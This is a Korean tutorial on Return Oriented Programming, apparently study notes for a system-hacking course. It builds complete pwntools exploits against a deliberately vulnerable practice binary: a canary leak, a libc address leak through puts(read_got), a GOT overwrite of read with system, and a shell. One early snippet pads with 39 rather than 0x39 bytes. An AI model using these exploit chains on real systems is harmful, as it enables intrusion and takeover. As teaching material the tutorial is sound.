가젯으로 구성된 페이로드를 작성하고 이 페이로드로 반환 주소를 덮으면 셸을 획득할 수 있다. 여기서 system 함수로 rip가 이동할 때 스택이 0x10 단위로 정렬되어 있지 않으면 system 함수 내부의 movaps 명령어 때문에 Segmentation Fault가 발생한다.
system 함수를 이용한 익스플로잇을 작성할 때 익스플로잇을 제대로 작성하였음에도 Segmentation Fault가 발생한다면 system 함수의 가젯을 8바이트 뒤로 미뤄보는 것이 좋다. 이를 위해서 아무 의미 없는 가젯(no-op gadget)을 system 함수 전에 추가할 수 있다.

## Return Oriented Programming
스택의 반환 주소를 덮는 공격이 스택 카나리, NX, ASLR이 도입되어 어려워졌다. 이에 따라 공격 기법은 셸코드의 실행에서 라이브러리 함수의 실행으로 그리고 다수의 리턴 가젯을 연결해서 사용하는 Return Oriented Programming(ROP)로 발전하였다. NX가 도입되면서 셸코드를 사용할 수 없게 되었고 코드 가젯과 라이브러리 함수를 활용하는 방법이 새롭게 등장하였다.
실제 상황에서는 많은 개발자가 system 함수가 공격 벡터로 사용할 수 있음을 알고 있기 때문에 실제 바이너리에서 system 함수가 PLT에 포함될 가능성은 거의 없다.
현실적으로 ASLR이 걸린 환경에서 system 함수를 사용하려면 프로세스에서 libc가 매핑된 주소를 찾고 그 주소로부터 system 함수의 오프셋을 이용하여 함수의 주소를 계산해야 한다. ROP는 이런 복잡한 제약 사항을 유연하게 해결할 수 있는 수단을 제공한다.

### Return Oriented Programming
ROP는 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법이다. ROP 페이로드는 리턴 가젯으로 구성되며 ret 단위로 여러 코드가 연쇄적으로 실행되는 모습에서 ROP chain이라고도 부른다.

```C
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main()
{
	char buf[0x30];
	
	setvbuf(stdin, 0, _IONBF, 0);
	setvbuf(stdout, 0, _IONBF, 0);
	
	// Leak canary
	puts("[1] Leak Canary");
	printf("Buf: ");
	read(0, buf, 0x100);
	printf("Buf: %s\n", buf);
	
	// Do ROP
	puts("[2] Input ROP payload");
	printf("Buf: ");
	read(0, buf, 0x100);
	
	return 0;
}
```

### 보호 기법

```zsh
╭─leekyohyun@ubuntu ~/Documents/syshack/stage7 
╰─$ checksec rop
[*] '/home/leekyohyun/Documents/syshack/stage7/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

카나리, ASLR, NX가 적용되어 있다.

### 코드 분석
바이너리에서 system 함수를 호출하지 않아 PLT에 등록되지 않고 "/bin/sh" 문자열 또한 데이터 섹션에 기록하지 않는다. 따라서 system 함수를 이용하기 위해서 직접 주소를 구해야 하며 "/bin/sh" 문자열을 사용할 수 있는 방법을 찾아야 한다.

### 익스플로잇 설계
##### 1. 카나리 우회

```python
from pwn  import *

p = process("./rop")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

buf = b"A"*39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)
```

##### 2. system 함수의 주소 계산
이 바이너리에서 사용하는 puts, printf, read 함수는 libc.so.6에 정의되어 있고, 여기에는 system 함수 또한 정의되어 있다. 라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되기 때문에 다른 함수들과 함께 system 함수도 프로세스 메모리에 같이 적재된다.
바이너리가 system 함수를 직접 호출하지 않아서 system 함수가 GOT에는 등록되지 않는다. 그러나 puts, printf, read 함수는 GOT에 등록되어 있다. main 함수에서 반환될 때는 이 함수들을 모두 호출한 이후이기 때문에 이들의 GOT를 읽을 수 있다면 libc.so.6가 매핑된 영역의 주소를 구할 수 있다.
같은 버전의 libc 안에서 두 데이터 사이의 거리(Offset)는 항상 같기 때문에 사용하는 libc의 버전을 알고 libc가 매핑된 영역의 임의 주소를 구할 수 있으면 다른 데이터의 주소를 모두 계산할 수 있다.

##### 3. “/bin/sh”
이 바이너리는 데이터 영역에 “/bin/sh” 문자열이 없기 때문에 이 문자열을 임의 버퍼에 직접 주입하여 참조하거나 다른 파일에 포함된 것을 사용해야 한다. 후자의 방법을 선택할 때는 libc.so.6 에 포함된 “/bin/sh” 문자열이 많이 사용된다.

```gdb
pwndbg> search /bin/sh
Searching for value: '/bin/sh'
libc-2.27.so    0x7ffff7b95d88 0x68732f6e69622f /* '/bin/sh' */
```

이 문자열의 주소 또한 system 함수의 주소를 구하는 것처럼 구할 수도 있다.

##### 4. GOT Overwrite
system 함수와 "/bin/sh" 문자열의 주소를 알아내었기 때문에 리턴 가젯을 활용해서 system("/bin/sh")를 실행할 수 있다. 그러나 system 함수의 주소를 알았을 때는 이미 ROP 페이로드가 전송된 후이기 때문에 system 함수의 주소를 페이로드에 사용하려면 main 함수로 돌아가서 다시 버퍼 오버플로우를 일으켜야 한다. 이러한 공격 패턴을 ret2main이라고 부른다.
Lazy binding 과정에서 GOT에 등록된 함수를 다시 호출할 때는 GOT에 적힌 주소를 별도의 검증 과정 없이 그대로 참조하기 때문에 GOT에 적힌 주소를 변조할 수 있다면 해당 함수가 재호출될 때 공격자가 원하는 코드가 실행되게 할 수 있다.

### 익스플로잇
##### 1. 카나리 우회

```python
from pwn  import *

p = process("./rop")

def slog(name, addr): return success(": ".join([name, hex(addr)]))

buf = b"A"*39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)
```

##### 2. system 함수의 주소 계산
pwntools의 ELF.symbols라는 메소드는 특정 ELF에서 심볼 사이의 오프셋을 계산할 때 유용하게 사용될 수 있다.

```python
from pwn import *

def slog(name, addr): return success(": ".join([name, hex(addr)]))
 
p = process("./rop")
e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.interactive()
```

##### 3. GOT Overwrite 및 “/bin/sh” 입력
“/bin/sh”는 덮어쓸 GOT 엔트리 뒤에 같이 입력한다. 이 바이너리에서는 입력을 위해 read 함수를 사용할 수 있다. read 함수는 입력 스트림, 입력 버퍼, 입력 길이, 총 세 개의 인자를 필요로 한다. 함수 호출 규약에 따르면 설정해야 하는 레지스터는 rdi, rsi, rdx이다.
앞의 두 인자는 pop rdi ; ret와 pop rsi ; pop r15 ; ret 가젯으로 쉽게 설정할 수 있지만 rdx와 관련된 가젯은 바이너리에서 찾기 어렵다. rdx와 관련된 가젯은 일반적인 바이너리에서도 찾기가 어렵다.
이럴 때는 libc의 코드 가젯이나 libc_csu_init 가젯을 사용하여 문제를 해결할 수 있다. 또는 rdx의 값을 변화시키는 함수를 호출해서 값을 설정할 수도 있다.
여기서는 read 함수의 GOT를 읽은 뒤 rdx 값이 매우 크게 설정되기 때문에 rdx를 설정하는 가젯을 추가하지 않아도 되지만 안정적인 익스플로잇을 위해 추가해도 된다.

```python
from pwn import *

def slog(name, addr): return success(": ".join([name, hex(addr)])) 

p = process("./rop")
e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc base", lb)
slog("system", system)

p.send(p64(system)+b"/bin/sh\x00")
```

##### 4. 셸 획득

```python
from pwn import *

def slog(name, addr): return success(": ".join([name, hex(addr)])) 

p = process("./rop")
e = ELF("./rop")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8

# puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read", read)
slog("libc base", lb)
slog("system", system)

p.send(p64(system)+b"/bin/sh\x00")

p.interactive()
```